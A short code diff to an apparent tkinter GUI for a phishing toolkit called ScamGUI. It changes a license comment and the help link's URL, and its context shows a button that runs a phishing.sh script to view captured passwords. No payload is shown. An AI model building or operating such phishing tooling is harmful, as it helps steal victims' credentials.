@@ -20,7 +20,7 @@
 #  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
 #  MA 02110-1301, USA.
 #
-#
+
 from tkinter import *
 
 import subprocess
@@ -52,7 +52,7 @@ def savepasswords():
     subprocess.Popen(['./phishing.sh', '--ver', '-passwords'])
 
 def help():
-    subprocess.Popen(['termux-open', 'https://youtube.com/channel/UCjUSc4m0DpPgJ3iHNZtQmQw'])
+    subprocess.Popen(['termux-open', 'https://github.com/Yisus7u7/ScamGUI'])
 
 
 
